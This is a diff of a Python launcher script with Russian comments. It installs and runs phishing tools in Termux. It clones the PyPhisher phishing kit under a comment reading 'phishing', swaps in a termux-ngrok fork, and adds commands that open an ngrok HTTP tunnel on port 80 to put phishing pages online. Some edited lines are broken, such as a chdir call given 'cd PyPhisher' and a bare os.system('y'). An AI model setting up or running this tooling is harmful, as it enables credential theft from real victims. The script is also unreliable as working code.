@@ -1,7 +1,5 @@
 import os, time
 
-os.system('clear')
-
 print ('[установка нужных файлов]')
 time.sleep(3)
 os.system('clear')
@@ -10,7 +8,7 @@ os.system('clear')
 os.system('pkg install python2')
 
 #нгрок
-os.system('git clone https://github.com/inconshreveable/ngrok.git')
+os.system('git clone https://github.com/tchelospy/termux-ngrok.git')
 
 #фишинг
 os.system('git clone https://github.com/KasRoudra/PyPhisher')
@@ -54,12 +52,15 @@ while True:
         os.chdir('termux-ngrok')
         os.system('chmod +x termux-ngrok.sh')
         os.system('./termux-ngrok.sh')
+        os.system('y')
+        os.system('ngrok http 80')
     
     if inp == '2':   
         print('[ВНИМАНИЕ ПЕРЕД ЗАПУСКОМ ВКЛЮИТЕ ТОЧКУ ДОСТУПА И МОБ ИНТЕРНЕТ]')
         tru = input('\n Включили? [y/n] >>> ')
         if tru == 'y':
-            os.system('cd PyPhisher')
+            os.system('cd $HOME')
+            os.chdir('cd PyPhisher')
             os.system('python3 pyphisher.py')
         if tru == 'n':
             os.system('clear')
